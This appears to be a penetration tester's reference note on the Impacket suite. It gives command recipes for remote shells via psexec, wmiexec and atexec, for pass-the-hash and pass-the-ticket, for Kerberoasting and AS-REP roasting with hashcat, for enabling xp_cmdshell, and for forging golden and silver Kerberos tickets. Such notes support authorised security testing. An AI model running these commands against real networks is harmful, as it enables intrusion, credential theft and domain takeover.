---
tags: [pentest, impacket, ad, suite, active-directory, initial-access, windows]
tool: impacket
phase: 5
---
# Impacket Suite - Overview

A Python collection of tools to interact with Windows protocols (SMB, MSRPC, Kerberos, LDAP, etc.) without needing a Windows attacker box. **Every AD pentest uses this.**

[[06 - Gaining Access/00 - README|Folder index]]

## Install

```bash
sudo apt install impacket-scripts   # Kali
# Or
pipx install impacket
which impacket-secretsdump impacket-psexec impacket-GetUserSPNs
```

> [!note] Naming convention
> Kali prepends `impacket-` to script names. So `psexec.py` becomes `impacket-psexec`. Both work.

## The "I have a credential" toolkit

| Tool | What it does |
| --- | --- |
| **psexec** | RCE via SMB Admin$ + service install (Sysinternals psexec equivalent) |
| **wmiexec** | RCE via DCOM/WMI - cleaner, fewer artifacts |
| **smbexec** | RCE via service + SMB - older style, semi-interactive |
| **atexec** | RCE via scheduled task creation |
| **dcomexec** | RCE via DCOM objects (MMC20, ShellWindows, etc.) |
| **secretsdump** | Dump SAM, LSA secrets, NTDS (the credential goldmine) |
| **lookupsid** | Enumerate SIDs / usernames |
| **getArch** | Probe arch over SMB |
| **services** | List/start/stop remote services |
| **rpcdump** | Enumerate RPC endpoints |
| **rpcmap** | Map RPC interfaces |

## The "I want a credential" toolkit

| Tool | What it does |
| --- | --- |
| **GetNPUsers** | AS-REP roast (users with DONT_REQ_PREAUTH) |
| **GetUserSPNs** | Kerberoast (users with SPNs) |
| **ntlmrelayx** | Relay captured NTLM auth to other services |
| **smbpasswd** | Change a user's password (you know the current) |
| **goldenPac** | Old MS14-068 PAC bypass |
| **ticketer** | Forge Kerberos tickets offline (golden/silver) |
| **getTGT** | Request a TGT given creds (Linux Kerberos handling) |
| **getST** | Request a service ticket |

## The "I'm authenticated" enumeration

| Tool | What it does |
| --- | --- |
| **GetADUsers** | List domain users via LDAP/SAMR |
| **GetADComputers** | List domain computers |
| **findDelegation** | Find accounts with delegation |
| **registryQuery** | Query remote registry |
| **reg.py** | Same idea, broader |
| **mssqlclient** | MSSQL client over TDS - supports `-windows-auth` and `-k` |
| **GetADCSPrivKey** | Pull AD CS keys |

## Auth syntax (consistent across most tools)

```bash
# Plain user:pass
impacket-psexec corp.local/user:pass@10.0.0.5

# Hash (PtH)
impacket-psexec -hashes :<NTLM> corp.local/user@10.0.0.5
impacket-psexec -hashes <LM>:<NTLM> corp.local/user@10.0.0.5

# Kerberos ticket (PtT)
export KRB5CCNAME=/tmp/ticket.ccache
impacket-psexec -k -no-pass corp.local/user@host.corp.local

# AES key
impacket-psexec -aesKey <hex> corp.local/user@10.0.0.5

# Specify DC explicitly
impacket-getTGT corp.local/user:pass -dc-ip 10.0.0.5
```

## Tool-by-tool quick recipes

### psexec / wmiexec / smbexec (interactive shells)

```bash
impacket-psexec corp.local/admin:pass@10.0.0.5
impacket-wmiexec corp.local/admin:pass@10.0.0.5
impacket-smbexec corp.local/admin:pass@10.0.0.5

# With PtH
impacket-psexec -hashes :<NTLM> corp.local/admin@10.0.0.5

# Single command, no interactive shell
impacket-wmiexec corp.local/admin:pass@10.0.0.5 'whoami /priv'
```

| Tool | Pros | Cons |
| --- | --- | --- |
| psexec | Reliable, gives SYSTEM | Loud (creates service, drops binary in ADMIN$) |
| wmiexec | Quieter; no service install | Sometimes flakey on slow links |
| smbexec | Semi-interactive | Older; psexec usually preferred |
| atexec | Single-command only | Logs scheduled task creation |

### atexec (single command via scheduled task)

```bash
impacket-atexec corp.local/admin:pass@10.0.0.5 'whoami'
```

### secretsdump - the goldmine

See dedicated note: [[14 - secretsdump]].

### GetNPUsers - AS-REP roast

```bash
impacket-GetNPUsers corp.local/ -no-pass -usersfile users.txt -dc-ip 10.0.0.5 -outputfile asrep.hash
# Then: hashcat -m 18200 asrep.hash rockyou.txt
```

### GetUserSPNs - Kerberoast

```bash
impacket-GetUserSPNs corp.local/user:pass -dc-ip 10.0.0.5 -request -outputfile tgs.hash
# Then: hashcat -m 13100 tgs.hash rockyou.txt
```

### mssqlclient

```bash
impacket-mssqlclient corp.local/admin:pass@10.0.0.5 -windows-auth
# Inside:
# > enable_xp_cmdshell
# > xp_cmdshell whoami
```

### ticketer - forge golden / silver tickets offline

```bash
# Golden (requires krbtgt hash)
impacket-ticketer -nthash <krbtgt_NTLM> -domain-sid S-1-5-21-... -domain corp.local Administrator
# Creates Administrator.ccache; load with export KRB5CCNAME=...

# Silver (requires service account hash)
impacket-ticketer -nthash <svc_NTLM> -domain-sid S-1-5-21-... -domain corp.local \
  -spn cifs/srv01.corp.local Administrator
```

## When you see X, do Y

| Error | Cause / fix |
| --- | --- |
| `KRB_AP_ERR_SKEW` | Clock skew > 5 min. `sudo ntpdate -u <dc-ip>` or `sudo rdate -n <dc-ip>` |
| `STATUS_LOGON_FAILURE` | Wrong cred |
| `STATUS_ACCESS_DENIED` | Cred is right; no rights on target service |
| `KDC_ERR_C_PRINCIPAL_UNKNOWN` | Username doesn't exist (or wrong realm) |
| `KDC_ERR_PREAUTH_FAILED` | Cred wrong (Kerberos path) |
| `STATUS_PASSWORD_EXPIRED` | Use `impacket-smbpasswd` to set a new password |
| `[-] Failed to authenticate` (no detail) | Try `-debug` flag |
| `errno 111 connection refused` | Service not listening / firewalled |

> [!tip] When unsure which to run
> Try `impacket-wmiexec` first (least intrusive). Fall back to `psexec` if WMI is firewalled. `smbexec` is the third-choice fallback.

## See also

- [[14 - secretsdump]]
- [[15 - Kerberoasting]]
- [[16 - AS-REP Roasting]]
- [[20 - DCSync]]
- [[26 - evil-winrm]] (alternative to impacket for WinRM)
- [[27 - psexec wmiexec smbexec]]
